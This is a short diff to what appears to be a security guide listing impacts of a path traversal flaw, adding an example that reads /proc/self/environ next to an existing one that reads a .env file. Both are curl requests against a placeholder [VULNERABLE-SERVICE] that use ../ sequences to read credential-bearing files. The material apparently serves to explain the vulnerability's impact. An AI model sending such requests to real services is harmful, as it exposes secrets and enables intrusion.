@@ -31,9 +31,14 @@
     ```
 
 - Application’s environment variable information exposure
-    ```bash
-    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../.env
-    ```
+    - By reading the process environment:
+        ```bash
+        curl https://[VULNERABLE-SERVICE]/read?filename=../../../../proc/self/environ
+        ```
+    - By reading the well-known file:
+        ```bash
+        curl https://[VULNERABLE-SERVICE]/read?filename=../../../../.env
+        ```
 
 - Backup file exposure
     ```bash
